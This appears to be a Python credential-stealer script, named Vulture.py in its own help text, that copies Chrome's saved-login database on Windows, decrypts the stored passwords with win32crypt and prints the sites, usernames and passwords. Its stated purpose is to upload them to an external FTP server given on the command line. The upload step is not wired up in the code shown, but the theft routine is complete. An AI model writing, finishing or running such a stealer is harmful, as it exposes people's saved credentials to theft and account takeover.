import sqlite3
import win32crypt
import getpass
import os
import ftplib
import argparse
from tempfile import gettempdir
from subprocess import Popen
from shutil import copy


class Extractor:

    host = ''
    username = ''
    password = ''
    save_dir = '/vulture/'

    def __init__(self, host, username, password):

        self.host = host
        self.username = username
        self.password = password

        try:
            ftp_connection = ftplib.FTP(host, username, password)
        except ConnectionRefusedError:
            print('Failed to connect to:\nHost: {}\nUsername: {}'.format(self.host, self.username))

    def pluck_passwords(self):
        windows_username = os.getlogin()
        PATH = 'C:/Users/{}/AppData/Local/Google/Chrome/User Data/Default/Login Data'.format(windows_username)

        copy(PATH, gettempdir())

        PATH = gettempdir() + '\\Login Data'
        conn = sqlite3.connect(PATH)
        cur = conn.cursor()
        user_data = None

        try:
            cur.execute('SELECT action_url, username_value, password_value FROM logins')
            user_data = cur.fetchall()

        except Exception:
            print('\nError fetching passwords.')

        for r in user_data:
            password = win32crypt.CryptUnprotectData(r[2], None, None, None, 0)[1]

            password = password.decode("utf-8")
            username = r[1]
            host = r[0]

            print(host, username, password)


def main():
    parser = argparse.ArgumentParser(
        description='Vulture.py, used to grab and upload Chrome passwords to an external FTP server.')

    parser.add_argument('-s', help='Server IP or host name')
    parser.add_argument('-u', help='FTP Username')
    parser.add_argument('-p', help='FTP Password')
    args = parser.parse_args()

    vulture = Extractor(args.s, args.u, args.p)


if __name__ == '__main__':
    main()
